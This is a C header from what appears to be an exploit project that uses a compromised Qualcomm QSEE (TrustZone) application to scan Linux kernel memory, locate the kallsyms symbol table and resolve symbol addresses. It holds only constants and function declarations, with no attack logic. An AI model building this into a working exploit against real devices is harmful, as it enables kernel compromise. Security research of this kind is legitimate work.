#ifndef __KALLSYMS_H__
#define __KALLSYMS_H__

#include "QSEEComAPI.h"

/**
 * The physical address of the linux kernel.
 */
#define KERNEL_PHYS_ADDR (0x8000)

/**
 * The upper bound of the kernel's size
 */
#define KERNEL_SIZE (0x1500000)

/**
 * The size of the kernel's code segment
 */
#define KERNEL_CODE_SIZE (0xEFB000)

/**
 * The number of DWORDs checked when probing for a symbol table page.
 */
#define SYMBOL_TABLE_DWORD_COUNT (4)

/**
 * The number of matching potential symbol table pages needed to confirm a symbol table.
 */
#define NUM_SYMBOL_TABLE_PAGES (3)

/**
 * The virtual address of the linux kernel.
 */
#define KERNEL_VIRT_ADDR (0xC0008000)

/**
 * The number of tokens composing the symbol names.
 */
#define KALLSYMS_NUM_TOKENS (256)

/**
 * The maximal size of a kallsyms symbol
 */
#define MAX_SYMBOL_SIZE (512)

/**
 * The alignment used when emitting kallsyms labels in the build script.
 */
#define LABEL_ALIGN (4*sizeof(uint32_t))

/**
 * The delta between kernel physical memory and virtual memory
 */
#define PHYS_TO_VIRT (KERNEL_VIRT_ADDR - KERNEL_PHYS_ADDR)

/**
 * Checks if the given address is a kernel virtual address.
 * @param addr The address to check
 * @return 1 iff the address is a kernel physical address, 0 otherwise.
 */
int is_kernel_virt_address(uint32_t addr);

/**
 * Checks if the page at the given offset from the kernel's physical base is a 
 * potential symbol table page (i.e., has monotone kernel virtual addresses).
 * @param handle The handle used to communicate with QSEECOM.
 * @param app The base address of the exploited QSEE application.
 * @param off The offset from the kernel's physical base address.
 * @return 1 iff the page is a potential symbol table page, 0 otherwise.
 */
int is_potential_symbol_table_page(struct qcom_wv_handle* handle, void* app, uint32_t off);

/**
 * Heuristically checks if the given page is a symbol table page.
 * @param handle The handle used to communicate with QSEECOM.
 * @param app The base address of the exploited QSEE application.
 * @param off The offset from the kernel's physical base address.
 * @return 1 iff the page is a chunk in a symbol table, 0, otherwise.
 */
int is_symbol_table(struct qcom_wv_handle* handle, void* app, uint32_t off);

/**
 * Finds the physical addresses related to the linux kernel symbol table.
 * @param handle The handle used to communicate with QSEECOM.
 * @param app The base address of the exploited QSEE application.
 * @return 0 if successful, a negative linux error code otherwise.
 */
int find_symbol_table_addresses(struct qcom_wv_handle* handle, void* app);

/**
 * Looks up the symbol with the given name from the kernel's symbol table.
 * @param handle The handle used to communicate with QSEECOM.
 * @param app The base address of the exploited QSEE application.
 * @param name The name of the symbol to lookup
 * @return The address of the found symbol, or zero if it wasn't found.
 */
uint32_t kallsyms_lookup_name(struct qcom_wv_handle* handle, void* app, char* name);

#endif
